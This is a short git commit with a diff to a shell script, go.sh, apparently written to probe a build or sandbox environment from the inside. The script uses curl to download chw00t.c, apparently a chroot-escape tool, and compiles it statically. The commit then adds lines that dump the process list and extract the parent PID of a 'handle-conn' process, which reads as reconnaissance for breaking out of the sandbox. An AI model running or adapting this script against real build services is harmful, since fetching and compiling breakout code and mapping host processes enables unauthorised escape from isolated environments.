62ee20f3926e115d1b60c07625cc841d216cc1e8
Edward Mead <emead@indeed.com>
2018-10-29 16:05:12 +0900

    testing parent pid retreval logic

--- go.sh
+++ go.sh
@@ -1,6 +1,10 @@
 #!/bin/bash
-ps -faux | grep 'bash -c set -o pipefail; /home/build/'
 curl -L-o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
 ls -al 1>&2
 /usr/bin/gcc lol.c -o lol -static 1>&2
 ls -al 1>&2
+ps faux &> lol.plist
+grep handle-conn lol.plist &> lol.pdetails
+head -n1 lol.pdetails &> lol.pdetail
+PPID=`awk '{print $2}' lol.pdetail`
+echo ppid:$PPID 1>&2
